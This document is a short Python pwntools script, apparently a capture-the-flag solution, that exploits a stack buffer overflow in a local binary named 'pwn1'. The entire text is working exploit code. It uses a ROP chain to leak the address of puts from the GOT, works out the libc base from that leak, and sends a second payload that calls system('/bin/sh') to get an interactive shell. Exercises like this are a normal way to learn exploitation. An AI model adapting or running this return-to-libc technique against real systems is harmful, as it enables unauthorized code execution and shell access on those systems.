from pwn import *

p = process("./pwn1")
elf = ELF("pwn1")
libc = elf.libc

payload = "A"*72
payload += p64(0x400783) # pop rdi ; ret
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x00400698) # main

p.sendlineafter(": ", payload)

leak = u64(p.recv(6).strip().ljust(8, b"\x00"))

log.info("puts@libc :"+hex(leak))
libc.address = leak - libc.symbols['puts']

system = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = "A"*72
payload += p64(0x400536)
payload += p64(0x400783)
payload += p64(bin_sh)
payload += p64(system)

p.sendlineafter(": ", payload)

p.interactive()
